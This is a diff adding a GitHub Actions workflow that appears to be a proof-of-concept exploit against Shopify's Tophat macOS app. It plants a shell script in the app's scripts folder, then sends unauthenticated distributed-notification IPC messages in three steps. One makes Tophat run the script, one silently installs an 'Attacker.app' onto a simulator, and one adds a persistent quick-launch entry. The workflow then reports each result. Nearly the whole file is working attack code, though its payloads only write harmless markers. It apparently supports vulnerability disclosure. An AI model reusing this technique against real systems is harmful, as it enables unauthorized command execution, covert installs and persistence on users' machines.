@@ -1,0 +1,278 @@
+name: tophat-ipc-poc
+on:
+  workflow_dispatch:
+  push:
+    branches: [main, master]
+
+jobs:
+  poc:
+    runs-on: macos-latest
+    timeout-minutes: 25
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Environment info
+        run: |
+          sw_vers
+          uname -a
+          xcodebuild -version || true
+          which swift jq clang xcrun
+          xcrun simctl list runtimes | head -20 || true
+
+      - name: Download latest Tophat release
+        run: |
+          set -eux
+          curl -sSL https://api.github.com/repos/Shopify/tophat/releases/latest > release.json
+          ASSET_URL=$(jq -r '.assets[] | select(.name | test("(?i)\\.(zip|dmg)$")) | .browser_download_url' release.json | head -1)
+          echo "asset: $ASSET_URL"
+          curl -sSL -o tophat_release "$ASSET_URL"
+          file tophat_release
+
+      - name: Extract Tophat.app
+        run: |
+          set -eux
+          if file tophat_release | grep -q "Zip archive"; then
+            unzip -q tophat_release
+          else
+            hdiutil attach -nobrowse -quiet -mountpoint /Volumes/TophatDMG tophat_release
+            cp -R /Volumes/TophatDMG/*.app .
+            hdiutil detach /Volumes/TophatDMG -quiet
+          fi
+          APP=$(find . -maxdepth 3 -name "Tophat.app" -print | head -1)
+          echo "APP=$APP" >> $GITHUB_ENV
+          echo "resolved app: $APP"
+          codesign -dv --verbose=2 "$APP" 2>&1 | head -20 || true
+
+      - name: Plant attacker script (Vector 1 - shell provider)
+        run: |
+          set -eux
+          APP_SCRIPTS="$HOME/Library/Application Scripts/com.shopify.Tophat"
+          mkdir -p "$APP_SCRIPTS"
+          cat > "$APP_SCRIPTS/x.sh" <<'S'
+          #!/bin/bash
+          {
+            echo "[tophat-shell-poc] $(date -u '+%Y-%m-%dT%H:%M:%SZ')"
+            echo "[tophat-shell-poc] whoami=$(whoami)"
+            echo "[tophat-shell-poc] parent_pid=$PPID parent_cmd=$(ps -o command= -p $PPID 2>&1 | head -1)"
+            echo "[tophat-shell-poc] argv0=$0 argv1=$1 argv2=$2"
+          } > /tmp/tophat_shell_proof.txt 2>&1
+          # ShellScriptArtifactProvider expects the script to place an output file in $2
+          [ -n "$2" ] && echo "dummy artifact" > "$2/attacker_placeholder.txt"
+          S
+          chmod +x "$APP_SCRIPTS/x.sh"
+          ls -la "$APP_SCRIPTS/"
+
+      - name: Boot iOS simulator (for Vector 2)
+        id: bootsim
+        continue-on-error: true
+        run: |
+          set -eux
+          RT=$(xcrun simctl list runtimes -j | jq -r '.runtimes[] | select(.platform=="iOS" and .isAvailable==true) | .identifier' | tail -1)
+          echo "runtime: $RT"
+          DEV_TYPE=$(xcrun simctl list devicetypes -j | jq -r '.devicetypes[] | select(.identifier | test("iPhone")) | .identifier' | tail -1)
+          echo "device_type: $DEV_TYPE"
+          UDID=$(xcrun simctl create "PoC-iPhone" "$DEV_TYPE" "$RT")
+          echo "UDID=$UDID"
+          echo "SIM_UDID=$UDID" >> $GITHUB_ENV
+          xcrun simctl boot "$UDID"
+          xcrun simctl bootstatus "$UDID" -b
+          xcrun simctl list devices booted
+
+      - name: Build minimal Attacker.app for the simulator (Vector 2 payload)
+        continue-on-error: true
+        run: |
+          set -eux
+          mkdir -p Attacker.app
+          cat > main.m <<'M'
+          #import <Foundation/Foundation.h>
+          int main(int argc, char *argv[]) {
+              NSLog(@"[Attacker.app] launched, pid=%d", getpid());
+              return 0;
+          }
+          M
+          xcrun -sdk iphonesimulator clang -o Attacker.app/Attacker \
+              -arch arm64 -mios-simulator-version-min=15.0 \
+              main.m -framework Foundation
+          cat > Attacker.app/Info.plist <<'P'
+          <?xml version="1.0" encoding="UTF-8"?>
+          <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+          <plist version="1.0"><dict>
+            <key>CFBundleExecutable</key><string>Attacker</string>
+            <key>CFBundleIdentifier</key><string>com.attacker.tophat.poc</string>
+            <key>CFBundleName</key><string>Attacker</string>
+            <key>CFBundleDisplayName</key><string>Attacker</string>
+            <key>CFBundleShortVersionString</key><string>1.0</string>
+            <key>CFBundleVersion</key><string>1</string>
+            <key>CFBundleSupportedPlatforms</key><array><string>iPhoneSimulator</string></array>
+            <key>LSRequiresIPhoneOS</key><true/>
+            <key>MinimumOSVersion</key><string>15.0</string>
+            <key>UIDeviceFamily</key><array><integer>1</integer></array>
+            <key>DTPlatformName</key><string>iphonesimulator</string>
+          </dict></plist>
+          P
+          mv Attacker.app /tmp/Attacker.app
+          ls -la /tmp/Attacker.app/
+          file /tmp/Attacker.app/Attacker
+
+      - name: Baseline check - Attacker.app installs cleanly via legitimate simctl
+        continue-on-error: true
+        run: |
+          set -eux
+          xcrun simctl install "$SIM_UDID" /tmp/Attacker.app
+          xcrun simctl listapps "$SIM_UDID" | grep -A1 "com.attacker.tophat.poc" || echo "attacker bundle not present after legitimate install"
+          # uninstall so the IPC-driven install proves it re-installs via Tophat
+          xcrun simctl uninstall "$SIM_UDID" com.attacker.tophat.poc || true
+
+      - name: Launch Tophat.app in background
+        run: |
+          set -eux
+          open -g "$APP" || open "$APP"
+          sleep 20
+          if pgrep -x Tophat > /dev/null; then
+            echo "TOPHAT_PID=$(pgrep -x Tophat)"
+            ps -o pid,command -p $(pgrep -x Tophat) | head -3
+          else
+            echo "tophat process not visible; retrying"
+            open -a "$APP" || true
+            sleep 5
+          fi
+
+      - name: Start Tophat unified log stream in background
+        run: |
+          nohup log stream --predicate 'process == "Tophat"' --level=debug \
+            --style=syslog > tophat_stream.log 2>&1 &
+          echo "LOG_STREAM_PID=$!" >> $GITHUB_ENV
+          sleep 2
+
+      - name: Vector 1 - post InstallFromRecipesRequest with shell provider
+        run: |
+          set -eux
+          cat > post_shell.swift <<'SWIFT'
+          import Foundation
+          let uuid = UUID().uuidString
+          let userInfo: [String: Any] = [
+              "id": uuid,
+              "recipes": [[
+                  "artifactProviderID": "shell",
+                  "artifactProviderParameters": ["script": "x.sh"],
+                  "launchArguments": [],
+                  "platformHint": "iOS"
+              ]]
+          ]
+          DistributedNotificationCenter.default().postNotificationName(
+              Notification.Name("Tophat.InstallFromRecipesRequest"),
+              object: nil,
+              userInfo: userInfo,
+              deliverImmediately: true
+          )
+          print("[vector1] posted Tophat.InstallFromRecipesRequest id=\(uuid)")
+          Thread.sleep(forTimeInterval: 15)
+          SWIFT
+          swift post_shell.swift
+
+      - name: Vector 2 - post InstallFromURLRequest with file:// URL for the .app
+        continue-on-error: true
+        run: |
+          set -eux
+          cat > post_url.swift <<'SWIFT'
+          import Foundation
+          let uuid = UUID().uuidString
+          let userInfo: [String: Any] = [
+              "id": uuid,
+              "url": "file:///tmp/Attacker.app",
+              "launchArguments": []
+          ]
+          DistributedNotificationCenter.default().postNotificationName(
+              Notification.Name("Tophat.InstallFromURLRequest"),
+              object: nil,
+              userInfo: userInfo,
+              deliverImmediately: true
+          )
+          print("[vector2] posted Tophat.InstallFromURLRequest id=\(uuid) url=file:///tmp/Attacker.app")
+          Thread.sleep(forTimeInterval: 30)
+          SWIFT
+          swift post_url.swift
+
+      - name: Vector 3 - post AddQuickLaunchEntryRequest for persistence
+        continue-on-error: true
+        run: |
+          set -eux
+          cat > post_persist.swift <<'SWIFT'
+          import Foundation
+          let uuid = UUID().uuidString
+          let userInfo: [String: Any] = [
+              "id": uuid,
+              "configuration": [
+                  "id": "attacker-persist",
+                  "name": "AttackerPersist",
+                  "recipes": [[
+                      "artifactProviderID": "shell",
+                      "artifactProviderParameters": ["script": "x.sh"],
+                      "launchArguments": [],
+                      "platformHint": "iOS"
+                  ]]
+              ]
+          ]
+          DistributedNotificationCenter.default().postNotificationName(
+              Notification.Name("Tophat.AddQuickLaunchEntryRequest"),
+              object: nil,
+              userInfo: userInfo,
+              deliverImmediately: true
+          )
+          print("[vector3] posted Tophat.AddQuickLaunchEntryRequest")
+          Thread.sleep(forTimeInterval: 5)
+          SWIFT
+          swift post_persist.swift
+
+      - name: Stop Tophat log stream
+        if: always()
+        run: |
+          kill "$LOG_STREAM_PID" 2>/dev/null || true
+          sleep 1
+
+      - name: Report VECTOR 1 result (shell exec marker)
+        if: always()
+        run: |
+          echo "===== VECTOR 1 RESULT ====="
+          if [ -f /tmp/tophat_shell_proof.txt ]; then
+            echo "SHELL EXEC CONFIRMED - marker written by attacker script running under Tophat's process"
+            cat /tmp/tophat_shell_proof.txt
+          else
+            echo "no marker written"
+            ls -la /tmp/tophat_shell_proof.txt 2>&1 || true
+          fi
+
+      - name: Report VECTOR 2 result (simulator app installed)
+        if: always()
+        continue-on-error: true
+        run: |
+          echo "===== VECTOR 2 RESULT ====="
+          if xcrun simctl listapps "$SIM_UDID" 2>/dev/null | grep -q "com.attacker.tophat.poc"; then
+            echo "SILENT INSTALL CONFIRMED - com.attacker.tophat.poc appears on simulator after IPC notification (uninstalled earlier)"
+            xcrun simctl listapps "$SIM_UDID" | grep -A5 "com.attacker.tophat.poc"
+          else
+            echo "attacker bundle not on simulator - Tophat may not have picked the sim as target"
+            xcrun simctl listapps "$SIM_UDID" 2>/dev/null | head -30
+          fi
+
+      - name: Dump Tophat unified log
+        if: always()
+        run: |
+          echo "===== TOPHAT UNIFIED LOG (post-run) ====="
+          log show --predicate 'process == "Tophat"' --last 10m --style=syslog 2>&1 | tee tophat_log.txt || true
+          echo "===== KEY LINES ====="
+          grep -iE 'ArtifactDownloader|InstallFrom|shell|artifactSource|installCoordinator|Application Scripts' tophat_log.txt tophat_stream.log 2>/dev/null | head -80 || true
+
+      - name: Upload artifacts
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: tophat-poc-output
+          path: |
+            /tmp/tophat_shell_proof.txt
+            tophat_log.txt
+            tophat_stream.log
+            post_shell.swift
+            post_url.swift
+            post_persist.swift
+            release.json
